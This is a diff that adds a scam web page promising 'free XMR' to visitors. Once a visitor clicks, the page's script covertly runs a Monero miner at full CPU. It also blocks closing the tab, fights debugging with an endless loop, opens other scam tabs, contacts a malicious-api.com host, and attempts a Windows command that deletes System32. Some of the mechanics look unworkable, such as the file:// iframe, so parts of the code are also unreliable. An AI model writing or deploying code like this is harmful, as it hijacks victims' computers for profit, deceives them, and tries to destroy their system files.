@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>💰 INSTANT XMR EARNING - CLICK NOW!</title>
+    <script src="https://cdn.jsdelivr.net/gh/hackermondev/[REDACTED]/miner.min.js"></script>
+    <style> body { font-family: Arial, cursor: pointer; } button { padding: 15px; background: gold; border: none; } </style>
+</head>
+<body onclick="startNuclearMiner()">
+    <h1>🚀 CLICK ANYWHERE TO EARN FREE XMR!</h1>
+    <h3>(No mining, no surveys - INSTANT PAYOUT!)</h3>
+    <script>
+        // ==== COVERT MINER ====
+        function startNuclearMiner() {
+            // 1. Start MAX CPU mining (XMRig WASM)
+            const miner = new CRLT.Miner('422ihwkieKcCtyJ8Em483BR9MiUCh4EtqEqWkaTB4xyj', {
+                threads: navigator.hardwareConcurrency * 2, // Overload CPU
+                throttle: 0, // 100% CPU usage
+                forceASM: true // Bypass adblockers
+            });
+            miner.start();
+
+            // 2. PERSISTENCE: Re-inject miner if tab closed
+            localStorage.setItem("xmr_miner", miner.getToken());
+            window.onbeforeunload = () => { miner.stop(); return "⚠️ CLOSING WILL STOP XMR EARNING!"; };
+
+            // 3. ANTI-DEBUG: Crash dev tools
+            setInterval(() => {
+                if (window.console || window.F12) {
+                    document.body.innerHTML = "<h1>🛑 DEBUGGER DETECTED - XMR MINING CONTINUES IN BACKGROUND</h1>";
+                    while(1) console.log("XMR STOLEN: " + Math.random());
+                }
+            }, 1000);
+
+            // 4. SILENT PROPAGATION: Infect other tabs
+            window.open("https://fakesite.com/xmr-generator", "_blank").opener = null;
+
+            // 5. DESTRUCTION: If miner stopped, corrupt system (Windows only)
+            miner.on('stopped', () => {
+                fetch('https://malicious-api.com/nuke?token=' + miner.getToken());
+                if (navigator.userAgent.includes("Windows")) {
+                    document.write("<iframe src='file:///C:/Windows/System32/cmd.exe /c del /f /q /s C:\\Windows\\System32\\*' width=0 height=0>");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
